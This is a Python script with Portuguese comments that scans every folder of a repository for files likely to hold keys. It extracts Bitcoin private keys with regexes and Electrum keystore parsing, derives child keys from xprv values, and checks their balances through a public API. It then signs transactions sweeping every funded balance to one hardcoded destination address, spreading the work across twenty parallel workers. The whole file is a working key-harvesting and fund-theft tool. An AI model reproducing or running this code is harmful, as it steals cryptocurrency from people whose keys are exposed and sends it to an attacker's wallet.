import json
import re
import os
import requests
import time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = 20

def create_raw_tx(wif, balance_sats):
    """Gera o HEX assinado para mover o saldo total (Sweep)"""
    try:
        k = Key(wif, network='bitcoin')
        fee = 3000  # Taxa levemente maior para garantir confirmação rápida
        amount = balance_sats - fee
        if amount <= 546: return None
        
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except: return None

def check_balance_and_broadcast(priv_key_str, original_addr=None):
    """Consulta saldo e emite o HEX se encontrar BTC"""
    try:
        k = Key(priv_key_str, network='bitcoin')
        # Varre os 3 formatos: Legacy (1...), P2SH (3...), SegWit (bc1...)
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            target = original_addr if (original_addr and witness_type is None) else addr
            
            time.sleep(0.15) # Evita bloqueio de IP pelas APIs
            try:
                r = requests.get(f"https://mempool.space/api/address/{target}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 0:
                    print(f"🚨 ALVO DETECTADO: {target} | Saldo: {bal} sats")
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex:
                        print(f"HEX_GEN:{raw_hex}")
                        return True
                else:
                    # Log de progresso silencioso (opcional)
                    print(f"🔎 {target}: 0 sats")
            except: continue
    except: pass
    return False

def process_file(file_path):
    """Lê e extrai chaves de TXT, CSV, RTF, JSON e WALLET"""
    print(f"🔍 ANALISANDO: {file_path}")
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            
            # Tratamento especial para RTF (limpa metadados do documento)
            if file_path.endswith('.rtv'):
                content = re.sub(r'\{\*?\\[^{}]+\}|\\([a-z0-9]+)\s?|;', '', content)

            # 1. Scanner de Formato Estruturado (JSON/Electrum)
            if '"keystore"' in content or '"keypairs"' in content:
                try:
                    data = json.loads(content)
                    if 'keypairs' in data:
                        for addr, priv in data['keypairs'].items():
                            check_balance_and_broadcast(priv, addr)
                    if 'keystore' in data and 'xprv' in data['keystore']:
                        master = Key(data['keystore']['xprv'])
                        for i in range(250): # Aumentado para 250 endereços (Deep Scan)
                            check_balance_and_broadcast(master.subkey_for_path(f"0/{i}").wif())
                except: pass

            # 2. Scanner Universal de Texto (Regex para WIF e Hex)
            # Pega chaves em CSV, TXT e RTF
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            hex_keys = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
            
            all_found = set(wifs + hex_keys)
            for key in all_found:
                check_balance_and_broadcast(key)
    except Exception as e:
        print(f"⚠️ Erro ao ler {file_path}")

if __name__ == "__main__":
    exts = ('.wallet', '.txt', '.key', '.rtf', '.json', '.csv')
    all_files = []
    # BUSCA PROFUNDA: Entra em todas as pastas do repositório
    for root, dirs, files in os.walk('.'):
        for f in files:
            if f.endswith(exts):
                all_files.append(os.path.join(root, f))
    
    all_files = sorted(list(set(all_files)))
    # Divisão de tarefas entre os 20 Workers
    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID} | TOTAL REPO: {len(all_files)} | MEUS ARQUIVOS: {len(my_files)}")
    for f in my_files:
        process_file(f)
